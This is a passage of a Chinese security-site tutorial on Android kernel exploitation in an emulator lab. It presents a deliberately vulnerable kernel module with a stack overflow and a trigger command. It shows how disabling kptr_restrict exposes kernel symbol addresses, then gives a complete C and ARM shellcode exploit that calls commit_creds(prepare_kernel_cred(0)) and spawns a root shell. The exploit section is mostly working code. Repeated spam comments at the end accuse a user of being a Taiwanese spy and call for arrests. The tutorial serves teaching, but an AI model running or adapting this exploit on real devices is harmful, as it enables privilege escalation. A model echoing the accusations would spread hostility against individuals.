+int&nbsp;proc_entry_write(struct&nbsp;file&nbsp;*file,&nbsp;const&nbsp;char&nbsp;__user&nbsp;*ubuf,&nbsp;unsigned&nbsp;long&nbsp;count,&nbsp;void&nbsp;*data)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;buf[MAX_LENGTH];
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(copy_from_user(&amp;buf,&nbsp;ubuf,&nbsp;count))&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printk(KERN_INFO&nbsp;&quot;stackBufferProcEntry:&nbsp;error&nbsp;copying&nbsp;data&nbsp;from&nbsp;userspace\n&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-EFAULT;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;count;
+}
+static&nbsp;int&nbsp;__init&nbsp;stack_buffer_proc_init(void)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;stack_buffer_proc_entry&nbsp;=&nbsp;create_proc_entry(&quot;stack_buffer_overflow&quot;,&nbsp;0666,&nbsp;NULL);
+&nbsp;&nbsp;&nbsp;&nbsp;stack_buffer_proc_entry-&gt;write_proc&nbsp;=&nbsp;proc_entry_write;
+&nbsp;&nbsp;&nbsp;&nbsp;printk(KERN_INFO&nbsp;&quot;created&nbsp;/proc/stack_buffer_overflow\n&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
+}
+static&nbsp;void&nbsp;__exit&nbsp;stack_buffer_proc_exit(void)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(stack_buffer_proc_entry)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;remove_proc_entry(&quot;stack_buffer_overflow&quot;,&nbsp;stack_buffer_proc_entry);
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;printk(KERN_INFO&nbsp;&quot;vuln_stack_proc_entry&nbsp;removed\n&quot;);
+}
+module_init(stack_buffer_proc_init);
+module_exit(stack_buffer_proc_exit);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">上述代码会创建</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">/proc/stack_buffer_overflow</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;设备文件 ，当向该设备文件调用 write 系统调用时会调用&nbsp;proc_entry_write 函数进行处理。漏洞显而易见，在&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">proc_entry_write</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;函数中 定义了一个 64 字节大小的栈缓冲区 buf， 然后使用</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;copy_from_user(&amp;buf, ubuf, count)</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;从用户空间 拷贝数据到 buf ,数据大小和内容均用户可控。于是当我们输入超过64字节时我们能够</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">覆盖其他的数据，比如返回地址等，进而劫持程序执行流到我们的 shellcode 中 进行提权</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先我们来试试触发漏洞。先把模拟器打开，然后&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">adb shell</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;进入模拟器，使用 &nbsp;echo 命令向</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;/proc/stack_buffer_overflow&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">设备输入72字节的数据。 &nbsp;&nbsp;</span></p><pre class="brush:plain;toolbar:false">echo&nbsp;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&nbsp;&gt;&nbsp;&nbsp;/proc/stack_buffer_overflow</pre><p style="text-align: center;"><img src="http://p2.qhimg.com/t015214c8b385b050aa.jpg" title="t010bf6c269e8062a9f.jpg" alt="http://p3.qhimg.com/t010bf6c269e8062a9f.jpg"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以看到 pc 寄存器的值 为&nbsp;0x41414141&nbsp;成功劫持。测试时该内核没开 pxn ，所以我们可以在用户态编写shellcode让内核去执行。提取的方式很简单，内核态调用&nbsp;&nbsp;commit_creds(prepare_kernel_cred(0));&nbsp;提升权限为 root, 然后返回 用户态 执行&nbsp;execl(&quot;/system/bin/sh&quot;, &quot;sh&quot;, NULL);&nbsp;起一个 root 权限的&nbsp;shell，&nbsp;完成提权。下面先获取&nbsp;prepare_kernel_cred&nbsp;和&nbsp;commit_creds&nbsp;函数的地址。在&nbsp;/proc/kallsyms&nbsp;文件中保存着所有的内核符号的名称和它在内存中的位置。不过在最近的内核版本中，为了使利用内核漏洞变得更加困难，linux内核目前禁止一般用户获取符号。具体可以看</span><a href="http://lwn.net/Articles/420403/" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里</a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">。</span><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当启用&nbsp;kptr_restrict&nbsp;是我们不能获取内核符号地址的。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">root@generic:/&nbsp;#&nbsp;cat&nbsp;/proc/kallsyms&nbsp;|&nbsp;grep&nbsp;commit_creds&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+00000000&nbsp;T&nbsp;commit_creds</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在本文中，把它禁用掉，不管他</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">root@generic:/&nbsp;#&nbsp;echo&nbsp;0&nbsp;&gt;&nbsp;/proc/sys/kernel/kptr_restrict&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+root@generic:/&nbsp;#&nbsp;cat&nbsp;/proc/kallsyms&nbsp;|&nbsp;grep&nbsp;commit_creds&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+c0039834&nbsp;T&nbsp;commit_creds
+root@generic:/&nbsp;#&nbsp;cat&nbsp;/proc/kallsyms&nbsp;|&nbsp;grep&nbsp;prepare_kernel_cred&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+c0039d34&nbsp;T&nbsp;prepare_kernel_cred</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">禁用掉之后，我们就可以通过&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">/proc/kallsyms</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;获取&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">commit_creds&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">和&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">prepare_kernel_cred</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">的地址。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">至此，提权的问题解决了，下面就是要回到用户态，在x86平台有&nbsp;iret指令可以回到用户态，在arm下返回用户态就更简单了。在arm下&nbsp;cpsr&nbsp;寄存器的&nbsp;M[4：0]&nbsp;位用来表示 处理器的运行模式，具体可以看</span><a href="http://www.cnblogs.com/armlinux/archive/2011/03/23/2396833.html" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个</a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">。所以我们把&nbsp;cpsr&nbsp;寄存器的&nbsp;M[4：0] 位设置为 10000后就表示 处理器进入了用户模式。</span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">所以现在的利用思路是：</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.调用&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">commit_creds(prepare_kernel_cred(0))&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">提升权限</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.调用&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">mov r3, #0x40000010; &nbsp; MSR &nbsp; &nbsp;CPSR_c,R3;&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">设置&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">cpsr</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">寄存器，使cpu进入用户模式</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.然后执行&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">execl(&quot;/system/bin/sh&quot;, &quot;sh&quot;, NULL);&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">起一个&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">root&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">权限的&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">shell</span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后的 exp :</span></strong></span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><pre class="brush:plain;toolbar:false">#include&nbsp;&lt;stdio.h&gt;
+#include&nbsp;&lt;string.h&gt;
+#include&nbsp;&lt;unistd.h&gt;
+#include&nbsp;&lt;fcntl.h&gt;
+#include&nbsp;&lt;sys/mman.h&gt;
+#define&nbsp;MAX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;64
+int&nbsp;open_file(void)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;fd&nbsp;=&nbsp;open(&quot;/proc/stack_buffer_overflow&quot;,&nbsp;O_RDWR);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(fd&nbsp;==&nbsp;-1)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;err(1,&nbsp;&quot;open&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;fd;
+}
+void&nbsp;payload(void)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;[+]&nbsp;enjoy&nbsp;the&nbsp;shell\n&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;execl(&quot;/system/bin/sh&quot;,&nbsp;&quot;sh&quot;,&nbsp;NULL);
+}
+extern&nbsp;uint32_t&nbsp;shellCode[];
+asm
+(
+&quot;&nbsp;&nbsp;&nbsp;&nbsp;.text\n&quot;
+&quot;&nbsp;&nbsp;&nbsp;&nbsp;.align&nbsp;2\n&quot;
+&quot;&nbsp;&nbsp;&nbsp;&nbsp;.code&nbsp;32\n&quot;
+&quot;&nbsp;&nbsp;&nbsp;&nbsp;.globl&nbsp;shellCode\n\t&quot;
+&quot;shellCode:\n\t&quot;
+//&nbsp;commit_creds(prepare_kernel_cred(0));
+//&nbsp;-&gt;&nbsp;get&nbsp;root
+&quot;LDR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;R3,&nbsp;=0xc0039d34\n\t&quot;&nbsp;&nbsp;&nbsp;//prepare_kernel_cred&nbsp;addr
+&quot;MOV&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;R0,&nbsp;#0\n\t&quot;
+&quot;BLX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;R3\n\t&quot;
+&quot;LDR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;R3,&nbsp;=0xc0039834\n\t&quot;&nbsp;&nbsp;&nbsp;//commit_creds&nbsp;addr
+&quot;BLX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;R3\n\t&quot;
+&quot;mov&nbsp;r3,&nbsp;#0x40000010\n\t&quot;
+&quot;MSR&nbsp;&nbsp;&nbsp;&nbsp;CPSR_c,R3\n\t&quot;
+&quot;LDR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;R3,&nbsp;=0x879c\n\t&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;payload&nbsp;function&nbsp;addr
+&quot;BLX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;R3\n\t&quot;
+);
+void&nbsp;trigger_vuln(int&nbsp;fd)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#define&nbsp;MAX_PAYLOAD&nbsp;(MAX&nbsp;+&nbsp;2&nbsp;&nbsp;*&nbsp;sizeof(void*)&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;buf[MAX_PAYLOAD];
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memset(buf,&nbsp;&#39;A&#39;,&nbsp;sizeof(buf));
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;void&nbsp;*&nbsp;pc&nbsp;=&nbsp;buf&nbsp;+&nbsp;MAX&nbsp;+&nbsp;&nbsp;1&nbsp;*&nbsp;sizeof(void*);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;shellcdoe&nbsp;addr:&nbsp;%p\n&quot;,&nbsp;shellCode);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;payload:%p\n&quot;,&nbsp;payload);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(void&nbsp;**)pc&nbsp;&nbsp;=&nbsp;(void&nbsp;*)&nbsp;shellCode;&nbsp;&nbsp;&nbsp;//ret&nbsp;addr
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Kaboom!&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(fd,&nbsp;buf,&nbsp;sizeof(buf)&nbsp;);
+}
+int&nbsp;main(void)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;fd;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fd&nbsp;=&nbsp;open_file();
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;trigger_vuln(fd);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload();
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;close(fd);
+}</pre><p style="text-align: center;"><img src="http://p2.qhimg.com/t01393cad942ae0cf1c.jpg" title="t0162e03029af9479e8.jpg" alt="http://p7.qhimg.com/t0162e03029af9479e8.jpg"/></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">参考链接</span></strong></span></p><hr/><p style="text-indent: 2em;"><a href="http://www.cnblogs.com/armlinux/archive/2011/03/23/2396833.html" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">http://www.cnblogs.com/armlinux/archive/2011/03/23/2396833.html</a></p><p style="text-indent: 2em;"><a href="http://blog.sina.com.cn/s/blog_6ac051b2010123cz.html" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">http://blog.sina.com.cn/s/blog_6ac051b2010123cz.html</span></a></p><p style="text-indent: 2em;"><a href="http://bobao.360.cn/learning/detail/3702.html" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">http://bobao.360.cn/learning/detail/3702.html</span></a></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><a href="https://github.com/Fuzion24/AndroidKernelExploitationPlayground" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;">https://github.com/Fuzion24/AndroidKernelExploitationPlayground</a></span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/4247.html
+                </p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】Android内核漏洞利用技术实战：环境搭建&栈溢出实战 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="4247" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/9x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="16081" user-name="followboy" href="javascript:;">
+                followboy            </a>
+                        <span class="comment-time">2017-08-16 10:12:00</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16081">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16081" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">//@Lo7up://@孤城守夜人://@小禾才露尖尖角54: //@Jioun_dai: 转发微博</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/0x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="16075" user-name="Ping溢出大神" href="javascript:;">
+                Ping溢出大神            </a>
+                        <span class="comment-time">2017-08-16 08:10:09</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16075">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16075" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">这个台湾间谍又在里面逼逼了国安局可以动手把在大陆台湾间谍抓了</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/0x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="16074" user-name="Ping溢出大神" href="javascript:;">
+                Ping溢出大神            </a>
+                        <span class="comment-time">2017-08-16 08:10:03</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16074">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16074" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">这个台湾间谍又在里面逼逼了国安局可以动手把在大陆台湾间谍抓了</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/0x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="16073" user-name="Ping溢出大神" href="javascript:;">
+                Ping溢出大神            </a>
+                        <span class="comment-time">2017-08-16 08:09:54</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16073">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16073" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">这个台湾间谍又在里面逼逼了国安局可以动手把在大陆台湾间谍抓了</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/0x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="16072" user-name="Ping溢出大神" href="javascript:;">
+                Ping溢出大神            </a>
+                        <span class="comment-time">2017-08-16 08:09:27</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16072">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16072" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">这个台湾间谍又在里面逼逼了国安局可以动手把在大陆台湾间谍抓了</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+<div class="clearfix re-comment">
+    <div class="comment-quote">  
+        <div class="comment-user">
+            <a href="javascript:;" class="response" data-bind-id="0" data-target="15997">hLt182</a> <span class="comment-time">2017-08-14 17:31:58</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="15997">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_15997" data-type="comment">点赞</a></span>            </div>
+            <p>Repost</p>
+        </div>
+    </div>
+        </div>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/2x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="16071" user-name="熊猫烧香作者" href="javascript:;">
+                熊猫烧香作者            </a>
+                        <span class="comment-time">2017-08-16 08:09:12</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16071">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16071" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">这个台湾间谍又在里面逼逼了国安局可以动手把在大陆台湾间谍抓了</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+<div class="clearfix re-comment">
+    <div class="comment-quote">  
+        <div class="comment-user">
+            <a href="javascript:;" class="response" data-bind-id="0" data-target="16024">Idbgu</a> <span class="comment-time">2017-08-14 22:22:10</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16024">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16024" data-type="comment">点赞</a></span>            </div>
+            <p>//@opoooi://@Jioun_dai: 转发微博</p>
+        </div>
+    </div>
+        </div>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/10x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="16070" user-name="大表哥" href="javascript:;">
+                大表哥            </a>
+                        <span class="comment-time">2017-08-16 08:08:49</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16070">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16070" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">这个台湾间谍又在里面逼逼了国安局可以动手把在大陆台湾间谍抓了</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+<div class="clearfix re-comment">
+    <div class="comment-quote">  
+        <div class="comment-user">
+            <a href="javascript:;" class="response" data-bind-id="0" data-target="16062">孤城守夜人</a> <span class="comment-time">2017-08-15 22:12:11</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16062">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16062" data-type="comment">点赞</a></span>            </div>
+            <p>//@小禾才露尖尖角54: //@Jioun_dai: 转发微博</p>
+        </div>
+    </div>
+        </div>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/2x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="16069" user-name="熊猫烧香作者" href="javascript:;">
+                熊猫烧香作者            </a>
+                        <span class="comment-time">2017-08-16 08:08:38</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16069">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16069" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
